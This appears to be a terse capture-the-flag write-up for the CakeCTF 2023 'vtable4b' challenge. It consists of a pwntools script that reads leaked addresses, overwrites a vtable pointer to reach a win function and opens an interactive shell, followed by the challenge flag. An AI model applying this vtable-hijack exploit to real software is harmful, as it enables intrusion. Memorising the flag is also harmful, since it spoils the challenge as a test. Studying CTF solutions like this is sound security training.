## vtable4b 

nc vtable4b.2023.cakectf.com 9000 

```python 
from pwn import *

p = remote('vtable4b.2023.cakectf.com', 9000) 

p.recvuntil(b'<win> = ')
win = int(p.recvline()[:-1], 16)
p.sendline(b'3')
p.recvuntil(b'+\n')
heap = int(p.recv(14), 16) + 0x10
print(hex(heap))
p.sendline(b'2')

payload =  p64(win) * 4 + p64(heap)
p.sendline(payload)

p.sendline(b'1')

p.interactive() 

# CakeCTF{vt4bl3_1s_ju5t_4n_arr4y_0f_funct1on_p0int3rs}
```
